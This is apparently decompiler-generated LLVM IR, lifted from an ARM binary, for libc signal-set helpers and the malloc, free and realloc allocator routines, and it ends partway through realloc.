define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15788 = load i32, i32* @r4, align 4
  store i32 %v3_15788, i32* %stack_var_-12, align 4
  %v6_15788 = load i32, i32* @r5, align 4
  %v10_15788 = ptrtoint i32* %stack_var_-12 to i32
  %v7_1578c = icmp eq i32 %arg2, -1
  %v0_15798.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_1578c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_157b0

bb:                                               ; preds = %entry
  %v2_15794 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_15798.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_15798.pre, 1
  br i1 %tmp19, label %dec_label_pc_157b0, label %dec_label_pc_157a0

dec_label_pc_157a0:                               ; preds = %bb
  %v7_157a4 = icmp sgt i32 %v0_15798.pre, 64
  br i1 %v7_157a4, label %dec_label_pc_157b0, label %bb20

bb20:                                             ; preds = %dec_label_pc_157a0
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_157d424 = add i32 %v10_15788, 124
  store i32 %v5_157d424, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_157c4

dec_label_pc_157b0:                               ; preds = %.thread, %dec_label_pc_157a0, %bb
  %v0_157b0 = call i32 @__errno_location()
  store i32 %v0_157b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_157bc = inttoptr i32 %v0_157b0 to i32*
  store i32 22, i32* %v2_157bc, align 4
  %v0_15830.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15830

dec_label_pc_157c4:                               ; preds = %bb20, %dec_label_pc_157c4
  %v5_157d425 = phi i32 [ %v5_157d424, %bb20 ], [ %v5_157d4, %dec_label_pc_157c4 ]
  %v2_157c8 = add i32 %v5_157d425, -136
  %v3_157c8 = inttoptr i32 %v2_157c8 to i32*
  store i32 0, i32* %v3_157c8, align 4
  %v0_157cc.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_157cc = add i32 %v0_157cc.pre, -1
  store i32 %v1_157cc, i32* %r0.global-to-local, align 4
  %v6_157cc = icmp slt i32 %v1_157cc, 0
  %v4_157d4 = mul i32 %v1_157cc, 4
  %v5_157d4 = add i32 %v4_157d4, %v10_15788
  store i32 %v5_157d4, i32* %r2.global-to-local, align 4
  br i1 %v6_157cc, label %dec_label_pc_157dc, label %dec_label_pc_157c4

dec_label_pc_157dc:                               ; preds = %dec_label_pc_157c4
  %v2_157dc = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_157dc, i32* @r5, align 4
  %v2_157e0 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_157e0, i32* @r0, align 4
  %v0_157e4 = load i32, i32* @r4, align 4
  store i32 %v0_157e4, i32* @r1, align 4
  %v0_157e8 = call i32 @__sigaddset()
  store i32 %v0_157e8, i32* %r0.global-to-local, align 4
  %v1_157ec = icmp slt i32 %v0_157e8, 0
  br i1 %v1_157ec, label %dec_label_pc_1582c, label %dec_label_pc_157f4

dec_label_pc_157f4:                               ; preds = %dec_label_pc_157dc
  %v0_157f4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2c858.960 to i32), i32* %r0.global-to-local, align 4
  %v2_157fc = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_2c858.960 to i32), i32 %v0_157f4)
  store i32 %v2_15794, i32* %r2.global-to-local, align 4
  %v0_15814 = load i32, i32* @r4, align 4
  store i32 %v0_15814, i32* %r0.global-to-local, align 4
  %v4_1581c = call i32 @__libc_sigaction(i32 %v0_15814, i32* nonnull %stack_var_-152, i32 %v2_15794)
  store i32 %v4_1581c, i32* %r0.global-to-local, align 4
  %v1_15820 = icmp slt i32 %v4_1581c, 0
  br i1 %v1_15820, label %dec_label_pc_1582c, label %bb23

bb23:                                             ; preds = %dec_label_pc_157f4
  %v5_15824 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_15824, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15830

dec_label_pc_1582c:                               ; preds = %dec_label_pc_157f4, %dec_label_pc_157dc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15830

dec_label_pc_15830:                               ; preds = %bb23, %dec_label_pc_157b0, %dec_label_pc_1582c
  %v0_15830 = phi i32 [ %v5_15824, %bb23 ], [ %v0_15830.pre, %dec_label_pc_157b0 ], [ -1, %dec_label_pc_1582c ]
  store i32 %v0_15830, i32* %r0.global-to-local, align 4
  %v2_15838 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15838, i32* @r4, align 4
  store i32 %v6_15788, i32* @r5, align 4
  ret i32 %v0_15830

; uselistorder directives
  uselistorder i32 %v0_15830, { 1, 0 }
  uselistorder i32 %v5_157d4, { 1, 0 }
  uselistorder i32 %v1_157cc, { 0, 2, 1 }
  uselistorder i32 %v2_15794, { 1, 0 }
  uselistorder i32 %v0_15798.pre, { 1, 0, 2 }
  uselistorder i32 %v10_15788, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_15830, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157c4, { 1, 0 }
  uselistorder label %dec_label_pc_157b0, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15840 = add i32 %arg2, -1
  %v3_15844 = udiv i32 %v1_15840, 32
  %v4_15848 = mul nuw nsw i32 %v3_15844, 4
  %v5_15848 = add i32 %v4_15848, %arg1
  %v6_15848 = inttoptr i32 %v5_15848 to i32*
  %v7_15848 = load i32, i32* %v6_15848, align 4
  %v1_1584c = urem i32 %v1_15840, 32
  %v7_15854 = shl i32 1, %v1_1584c
  %v8_15854 = and i32 %v7_15848, %v7_15854
  %v10_15854 = icmp ne i32 %v8_15854, 0
  %. = zext i1 %v10_15854 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_15840, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_15864 = load i32, i32* @r1, align 4
  %v1_15864 = add i32 %v0_15864, -1
  %v3_15868 = udiv i32 %v1_15864, 32
  %v0_1586c = load i32, i32* @r0, align 4
  %v4_1586c = mul nuw nsw i32 %v3_15868, 4
  %v5_1586c = add i32 %v0_1586c, %v4_1586c
  %v6_1586c = inttoptr i32 %v5_1586c to i32*
  %v7_1586c = load i32, i32* %v6_1586c, align 4
  %v1_15870 = urem i32 %v1_15864, 32
  %v7_15878 = shl i32 1, %v1_15870
  %v8_15878 = or i32 %v7_1586c, %v7_15878
  store i32 %v8_15878, i32* %v6_1586c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15864, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15888 = add i32 %arg2, -1
  %v3_1588c = udiv i32 %v1_15888, 32
  %v4_15890 = mul nuw nsw i32 %v3_1588c, 4
  %v5_15890 = add i32 %v4_15890, %arg1
  %v6_15890 = inttoptr i32 %v5_15890 to i32*
  %v7_15890 = load i32, i32* %v6_15890, align 4
  %v1_15894 = urem i32 %v1_15888, 32
  %tmp = shl i32 -1, %v1_15894
  %v8_1589c = add i32 %tmp, -1
  %v9_1589c = and i32 %v7_15890, %v8_1589c
  store i32 %v9_1589c, i32* %v6_15890, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15888, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_158ac = load i32, i32* @r4, align 4
  %v6_158ac = load i32, i32* @r5, align 4
  %v9_158ac = load i32, i32* @r6, align 4
  %v0_158b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_158b0 = icmp eq i32 %v0_158b0, 0
  %v2_158b4 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_158b0, label %bb, label %dec_label_pc_158c0

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158c8

dec_label_pc_158c0:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_158b0, -8
  br i1 %tmp, label %dec_label_pc_159cc, label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %bb, %dec_label_pc_158c0
  %v0_158c8 = phi i32 [ %v0_158b0, %dec_label_pc_158c0 ], [ 1, %bb ]
  %v1_158c8 = add i32 %v0_158c8, 4
  store i32 %v1_158c8, i32* %stack_var_-20, align 4
  store i32 %v2_158b4, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2c7e8.962 to i32), i32* %r0.global-to-local, align 4
  %v1_158e0 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_26398.966 to i32), i32* %r0.global-to-local, align 4
  %v3_158ec = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_26398.966 to i32*), i32 %v2_158b4)
  store i32 %v3_158ec, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c7e8.962 to i32), i32* %r0.global-to-local, align 4
  store i32 88324, i32* @lr, align 4
  %v1_15900 = call i32 @__pthread_return_0()
  store i32 %v1_15900, i32* %r0.global-to-local, align 4
  %v2_15904 = icmp eq i32 %v3_158ec, 0
  br i1 %v2_15904, label %dec_label_pc_1590c, label %dec_label_pc_159bc

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158c8
  %v2_15910 = load i32, i32* @global_var_2c810.813, align 4
  store i32 %v2_15910, i32* @r4, align 4
  %v2_15914 = load i32, i32* %stack_var_-20, align 4
  %v3_15918 = icmp ult i32 %v2_15914, %v2_15910
  br i1 %v3_15918, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_1590c
  %v3_1591c = add i32 %v2_15910, -1
  %v2_15920 = add i32 %v3_1591c, %v2_15914
  %v2_15924 = sub i32 0, %v2_15910
  %v3_15928 = and i32 %v2_15920, %v2_15924
  store i32 %v3_15928, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1590c, %bb14
  store i32 ptrtoint (i32* @global_var_2c8d8.970 to i32), i32* %r0.global-to-local, align 4
  %v1_15934 = call i32 @__pthread_return_0()
  %v0_15938 = load i32, i32* @r4, align 4
  store i32 %v0_15938, i32* %r0.global-to-local, align 4
  %v1_1593c = call i32 @__GI_sbrk(i32 %v0_15938)
  store i32 %v1_1593c, i32* %r0.global-to-local, align 4
  %v7_15940 = icmp eq i32 %v1_1593c, -1
  br i1 %v7_15940, label %bb15, label %dec_label_pc_1594c

bb15:                                             ; preds = %.thread3
  store i32 %v1_1593c, i32* @r5, align 4
  br label %dec_label_pc_15960

dec_label_pc_1594c:                               ; preds = %.thread3
  %v1_1594c = add i32 %v1_1593c, 3
  %v1_15950 = and i32 %v1_1594c, -4
  store i32 %v1_15950, i32* @r5, align 4
  %v9_15954 = icmp eq i32 %v1_15950, %v1_1593c
  br i1 %v9_15954, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_1594c
  %v3_15958 = sub i32 %v1_15950, %v1_1593c
  store i32 %v3_15958, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1594c, %bb16
  %v1_1595c = xor i1 %v9_15954, true
  call void @__pseudo_cond_branch(i1 %v1_1595c, i32 ptrtoint (i32* @global_var_1702c.971 to i32))
  br label %dec_label_pc_15960

dec_label_pc_15960:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_2c8d8.970 to i32), i32* %r0.global-to-local, align 4
  store i32 88432, i32* @lr, align 4
  %v1_1596c = call i32 @__pthread_return_0()
  store i32 %v1_1596c, i32* %r0.global-to-local, align 4
  %v0_15970 = load i32, i32* @r5, align 4
  %v7_15970 = icmp eq i32 %v0_15970, -1
  br i1 %v7_15970, label %dec_label_pc_159cc, label %dec_label_pc_15978

dec_label_pc_15978:                               ; preds = %dec_label_pc_15960
  store i32 ptrtoint (i32* @global_var_2c7e8.962 to i32), i32* %r0.global-to-local, align 4
  %v1_15984 = call i32 @__pthread_return_0()
  %v0_15988 = load i32, i32* @r4, align 4
  %v0_1598c = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_26398.966 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_1598c, 16777216
  %v2_15994 = sdiv i32 %sext, 16777216
  %v5_15994 = call i32 @__heap_free(i32* bitcast (i32** @global_var_26398.966 to i32*), i32 %v2_15994, i32 %v0_15988)
  store i32 ptrtoint (i32** @global_var_26398.966 to i32), i32* %r0.global-to-local, align 4
  %v3_159a0 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_26398.966 to i32*), i32 %v2_158b4)
  store i32 %v3_159a0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c7e8.962 to i32), i32* %r0.global-to-local, align 4
  store i32 88500, i32* @lr, align 4
  %v1_159b0 = call i32 @__pthread_return_0()
  store i32 %v1_159b0, i32* %r0.global-to-local, align 4
  %v2_159b4 = icmp eq i32 %v3_159a0, 0
  br i1 %v2_159b4, label %dec_label_pc_159cc, label %dec_label_pc_159bc

dec_label_pc_159bc:                               ; preds = %dec_label_pc_158c8, %dec_label_pc_15978
  %v1_159c0 = phi i32 [ %v3_158ec, %dec_label_pc_158c8 ], [ %v3_159a0, %dec_label_pc_15978 ]
  %v2_159bc = load i32, i32* %stack_var_-20, align 4
  %v2_159c0 = inttoptr i32 %v1_159c0 to i32*
  store i32 %v2_159bc, i32* %v2_159c0, align 4
  %v3_159c0 = load i32, i32* %r4.global-to-local, align 4
  %v4_159c0 = add i32 %v3_159c0, 4
  store i32 %v4_159c0, i32* %r4.global-to-local, align 4
  %v2_159c4 = icmp eq i32 %v4_159c0, 0
  br i1 %v2_159c4, label %dec_label_pc_159cc, label %dec_label_pc_159dc

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159bc, %dec_label_pc_15978, %dec_label_pc_15960, %dec_label_pc_158c0
  %v0_159cc = call i32 @__errno_location()
  store i32 %v0_159cc, i32* %r0.global-to-local, align 4
  %v2_159d4 = inttoptr i32 %v0_159cc to i32*
  store i32 12, i32* %v2_159d4, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_159dc

dec_label_pc_159dc:                               ; preds = %dec_label_pc_159bc, %dec_label_pc_159cc
  %v0_159dc = phi i32 [ %v4_159c0, %dec_label_pc_159bc ], [ 0, %dec_label_pc_159cc ]
  store i32 %v0_159dc, i32* %r0.global-to-local, align 4
  store i32 %v3_158ac, i32* @r4, align 4
  store i32 %v6_158ac, i32* @r5, align 4
  store i32 %v9_158ac, i32* @r6, align 4
  ret i32 %v0_159dc

; uselistorder directives
  uselistorder i32 %v0_159dc, { 1, 0 }
  uselistorder i32 %v3_159a0, { 1, 0, 2 }
  uselistorder i32 %v1_15950, { 1, 0, 2 }
  uselistorder i32 %v1_1593c, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %v3_158ec, { 1, 0, 2 }
  uselistorder i32 %v0_158b0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 1, 6, 8, 9, 10, 4, 12, 11, 16, 14, 13, 0, 15, 17, 18, 19, 2, 3 }
  uselistorder label %dec_label_pc_159dc, { 1, 0 }
  uselistorder label %dec_label_pc_159bc, { 1, 0 }
  uselistorder label %dec_label_pc_15960, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_158c8, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_15a00 = load i32, i32* @r0, align 4
  %v2_15a00 = icmp eq i32 %v0_15a00, 0
  %v3_15a04 = load i32, i32* @r4, align 4
  store i32 %v3_15a04, i32* %stack_var_-24, align 4
  %v6_15a04 = load i32, i32* @r5, align 4
  %v9_15a04 = load i32, i32* @r6, align 4
  %v15_15a04 = load i32, i32* @r8, align 4
  br i1 %v2_15a00, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_15a0c = add i32 %v0_15a00, -4
  %v2_15a0c = inttoptr i32 %v1_15a0c to i32*
  %v3_15a0c = load i32, i32* %v2_15a0c, align 4
  store i32 %v3_15a0c, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_26398.966 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_15a0c, i32* @r4, align 4
  %v1_15a24 = call i32 @__pthread_return_0()
  %v0_15a28 = load i32, i32* @r4, align 4
  %v0_15a2c = load i32, i32* @r5, align 4
  %v4_15a34 = call i32 @__heap_free(i32* bitcast (i32** @global_var_26398.966 to i32*), i32 %v0_15a28, i32 %v0_15a2c)
  %v1_15a3c = inttoptr i32 %v4_15a34 to i32*
  %v2_15a3c = load i32, i32* %v1_15a3c, align 4
  store i32 %v2_15a3c, i32* %r6.global-to-local, align 4
  %v2_15a40 = load i32, i32* @global_var_2c810.813, align 4
  %v4_15a44 = mul i32 %v2_15a40, 8
  %v6_15a44 = icmp ult i32 %v2_15a3c, %v4_15a44
  store i32 %v4_15a34, i32* @r4, align 4
  br i1 %v6_15a44, label %dec_label_pc_15a84, label %dec_label_pc_15a50

dec_label_pc_15a50:                               ; preds = %bb11
  %v1_15a58 = call i32 @__pthread_return_0()
  %v1_15a60 = call i32 @__GI_sbrk(i32 0)
  %v0_15a64 = load i32, i32* @r4, align 4
  %v1_15a64 = add i32 %v0_15a64, 12
  store i32 %v1_15a64, i32* @r5, align 4
  %v9_15a68 = icmp eq i32 %v1_15a64, %v1_15a60
  br i1 %v9_15a68, label %dec_label_pc_15a8c, label %dec_label_pc_15a70

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a50
  %v1_15a7c = call i32 @__pthread_return_0()
  br label %dec_label_pc_15a84

dec_label_pc_15a84:                               ; preds = %bb11, %dec_label_pc_15a70, %bb14
  %v2_15a84 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15a84, i32* @r4, align 4
  store i32 %v6_15a04, i32* @r5, align 4
  store i32 %v9_15a04, i32* %r6.global-to-local, align 4
  store i32 %v15_15a04, i32* %r8.global-to-local, align 4
  %v0_15a88 = call i32 @__pthread_return_0()
  %v0_15a8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15a8c

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a50, %dec_label_pc_15a84
  %v1_15a94 = phi i32 [ %v0_15a64, %dec_label_pc_15a50 ], [ %v0_15a8c.pre, %dec_label_pc_15a84 ]
  %v1_15a8c = add i32 %v1_15a94, 4
  %v2_15a8c = inttoptr i32 %v1_15a8c to i32*
  %v3_15a8c = load i32, i32* %v2_15a8c, align 4
  %v2_15a90 = icmp eq i32 %v3_15a8c, 0
  br i1 %v2_15a90, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_15a8c
  %v2_15a94 = add i32 %v1_15a94, 8
  %v3_15a94 = inttoptr i32 %v2_15a94 to i32*
  %v4_15a94 = load i32, i32* %v3_15a94, align 4
  %v3_15a98 = add i32 %v3_15a8c, 8
  %v4_15a98 = inttoptr i32 %v3_15a98 to i32*
  store i32 %v4_15a94, i32* %v4_15a98, align 4
  %v0_15a9c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15a8c, %bb12
  %v0_15a9c = phi i32 [ %v1_15a94, %dec_label_pc_15a8c ], [ %v0_15a9c.pre, %bb12 ]
  %v1_15a9c = add i32 %v0_15a9c, 8
  %v2_15a9c = inttoptr i32 %v1_15a9c to i32*
  %v3_15a9c = load i32, i32* %v2_15a9c, align 4
  %v1_15aa0 = add i32 %v0_15a9c, 4
  %v2_15aa0 = inttoptr i32 %v1_15aa0 to i32*
  %v3_15aa0 = load i32, i32* %v2_15aa0, align 4
  %v2_15aa4 = icmp eq i32 %v3_15a9c, 0
  br i1 %v2_15aa4, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_15aa8 = add i32 %v3_15a9c, 4
  %v4_15aa8 = inttoptr i32 %v3_15aa8 to i32*
  store i32 %v3_15aa0, i32* %v4_15aa8, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_15aac = load i32, i32* %r8.global-to-local, align 4
  %v3_15aac = inttoptr i32 %v2_15aac to i32*
  store i32 %v3_15aa0, i32* %v3_15aac, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_15abc = call i32 @__pthread_return_0()
  %v0_15ac0 = load i32, i32* %r6.global-to-local, align 4
  %v1_15ac0 = load i32, i32* @r4, align 4
  %v0_15ac8 = load i32, i32* @r5, align 4
  %v2_15ac0 = sub i32 12, %v0_15ac0
  %v1_15ac4 = add i32 %v2_15ac0, %v1_15ac0
  %v2_15ac8 = sub i32 %v1_15ac4, %v0_15ac8
  %v1_15acc = call i32 @__GI_sbrk(i32 %v2_15ac8)
  br label %dec_label_pc_15a84

; uselistorder directives
  uselistorder i32 %v0_15a9c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_15a8c, { 1, 0 }
  uselistorder label %dec_label_pc_15a84, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15af0 = load i32, i32* @r4, align 4
  store i32 %v3_15af0, i32* %stack_var_-24, align 4
  %v6_15af0 = load i32, i32* @r5, align 4
  %v9_15af0 = load i32, i32* @r6, align 4
  %v12_15af0 = load i32, i32* @r7, align 4
  %v15_15af0 = load i32, i32* @r8, align 4
  %v18_15af0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_15af4 = icmp eq i32 %arg2, 0
  %v0_15af8 = load i32, i32* @r0, align 4
  store i32 %v0_15af8, i32* @r7, align 4
  br i1 %v2_15af4, label %dec_label_pc_15b00, label %dec_label_pc_15b08

dec_label_pc_15b00:                               ; preds = %entry
  %v0_15b00 = call i32 @free()
  %v0_15b10.pre = load i32, i32* @r4, align 4
  %v2_15b14.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_15b10

dec_label_pc_15b08:                               ; preds = %entry
  %v2_15b08 = icmp eq i32 %v0_15af8, 0
  br i1 %v2_15b08, label %dec_label_pc_15b10, label %dec_label_pc_15b1c

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15b08, %dec_label_pc_15b00
  %v2_15b14 = phi i32 [ %v3_15af0, %dec_label_pc_15b08 ], [ %v2_15b14.pre, %dec_label_pc_15b00 ]
  %v0_15b10 = phi i32 [ %arg2, %dec_label_pc_15b08 ], [ %v0_15b10.pre, %dec_label_pc_15b00 ]
  store i32 %v2_15b14, i32* @r4, align 4
  store i32 %v6_15af0, i32* @r5, align 4
  store i32 %v9_15af0, i32* @r6, align 4
  store i32 %v12_15af0, i32* @r7, align 4
  store i32 %v18_15af0, i32* @lr, align 4
  %v1_15b18 = call i32 @malloc(i32 %v0_15b10)
  %v0_15b1c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15b1c

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b08, %dec_label_pc_15b10
  %v0_15b34 = phi i32 [ %v0_15af8, %dec_label_pc_15b08 ], [ %v1_15b18, %dec_label_pc_15b10 ]
  %v0_15b1c = phi i32 [ %arg2, %dec_label_pc_15b08 ], [ %v0_15b1c.pre, %dec_label_pc_15b10 ]
  %v1_15b1c = add i32 %v0_15b1c, 7
  %v1_15b20 = and i32 %v1_15b1c, -4
  store i32 %v1_15b20, i32* @r5, align 4
  %v2_15b24 = icmp ugt i32 %v1_15b20, 10
  %v1_15b28 = add i32 %v0_15b34, -4
  %v2_15b28 = inttoptr i32 %v1_15b28 to i32*
  %v3_15b28 = load i32, i32* %v2_15b28, align 4
  store i32 %v3_15b28, i32* @r6, align 4
  br i1 %v2_15b24, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_15b1c
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_15b1c, %bb
  %v0_15bb0 = phi i32 [ %v1_15b20, %dec_label_pc_15b1c ], [ 12, %bb ]
  store i32 %v1_15b28, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_15bb0, %v3_15b28
  br i1 %tmp, label %dec_label_pc_15b3c, label %dec_label_pc_15bb0

dec_label_pc_15b3c:                               ; preds = %bb14
  %v2_15b30 = sub i32 %v0_15bb0, %v3_15b28
  %v1_15b4c = call i32 @__pthread_return_0()
  %v0_15b54 = load i32, i32* @r8, align 4
  %v1_15b54 = load i32, i32* @r6, align 4
  %v2_15b54 = add i32 %v1_15b54, %v0_15b54
  %v4_15b5c = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_26398.966 to i32*), i32 %v2_15b54, i32 %v2_15b30)
  store i32 %v4_15b5c, i32* @r4, align 4
  store i32 88948, i32* @lr, align 4
  %v1_15b70 = call i32 @__pthread_return_0()
  %v0_15b74 = load i32, i32* @r4, align 4
  %v2_15b74 = icmp eq i32 %v0_15b74, 0
  br i1 %v2_15b74, label %dec_label_pc_15b84, label %.thread

.thread:                                          ; preds = %dec_label_pc_15b3c
  %v1_15b78 = load i32, i32* @r6, align 4
  %v3_15b78 = add i32 %v1_15b78, %v0_15b74
  %v2_15b7c = load i32, i32* @r7, align 4
  %v3_15b7c = add i32 %v2_15b7c, -4
  %v4_15b7c = inttoptr i32 %v3_15b7c to i32*
  store i32 %v3_15b78, i32* %v4_15b7c, align 4
  br label %dec_label_pc_15bf0

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15b3c
  %v0_15b84 = load i32, i32* @r5, align 4
  %v1_15b84 = add i32 %v0_15b84, -4
  %v1_15b88 = call i32 @malloc(i32 %v1_15b84)
  store i32 %v1_15b88, i32* @r0, align 4
  store i32 %v1_15b88, i32* @r4, align 4
  %v2_15b8c = icmp eq i32 %v1_15b88, 0
  br i1 %v2_15b8c, label %dec_label_pc_15ba8, label %dec_label_pc_15b94

dec_label_pc_15b94:                               ; preds = %dec_label_pc_15b84
  %v0_15b94 = load i32, i32* @r6, align 4
  %v1_15b94 = add i32 %v0_15b94, -4
  store i32 %v1_15b94, i32* @r2, align 4
  %v0_15b98 = load i32, i32* @r7, align 4
  store i32 %v0_15b98, i32* @r1, align 4
  %v0_15b9c = call i32 @memcpy()
  %v0_15ba0 = load i32, i32* @r7, align 4
  store i32 %v0_15ba0, i32* @r0, align 4
  %v0_15ba4 = call i32 @free()
  %v0_15ba8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15ba8:                               ; preds = %dec_label_pc_15b84, %dec_label_pc_15b94
  %v0_15ba8 = phi i32 [ 0, %dec_label_pc_15b84 ], [ %v0_15ba8.pre, %dec_label_pc_15b94 ]
  store i32 %v0_15ba8, i32* @r7, align 4
  br label %dec_label_pc_15bf0

dec_label_pc_15bb0:                               ; preds = %bb14
  %v1_15bb0 = add i32 %v0_15bb0, 28
  %tmp15 = icmp ugt i32 %v1_15bb0, %v3_15b28
  br i1 %tmp15, label %dec_label_pc_15bf0, label %dec_label_pc_15bbc

dec_label_pc_15bbc:                               ; preds = %dec_label_pc_15bb0
  %v1_15bc8 = call i32 @__pthread_return_0()
  %v0_15bcc = load i32, i32* @r8, align 4
  %v1_15bcc = load i32, i32* @r5, align 4
  %v2_15bcc = add i32 %v1_15bcc, %v0_15bcc
  %v1_15bd0 = load i32, i32* @r6, align 4
  %v2_15bd0 = sub i32 %v1_15bd0, %v1_15bcc
  %v4_15bd8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_26398.966 to i32*), i32 %v2_15bcc, i32 %v2_15bd0)
  store i32 89068, i32* @lr, align 4
  %v1_15be8 = call i32 @__pthread_return_0()
  %v0_15bec = load i32, i32* @r5, align 4
  %v1_15bec = load i32, i32* @r7, align 4
  %v2_15bec = add i32 %v1_15bec, -4
  %v3_15bec = inttoptr i32 %v2_15bec to i32*
  store i32 %v0_15bec, i32* %v3_15bec, align 4
  br label %dec_label_pc_15bf0

dec_label_pc_15bf0:                               ; preds = %.thread, %dec_label_pc_15bb0, %dec_label_pc_15ba8, %dec_label_pc_15bbc
  %v0_15bf0 = load i32, i32* @r7, align 4
  store i32 %v9_15af0, i32* @r6, align 4
  store i32 %v15_15af0, i32* @r8, align 4
  ret i32 %v0_15bf0

; uselistorder directives
  uselistorder i32 %v1_15bcc, { 1, 0 }
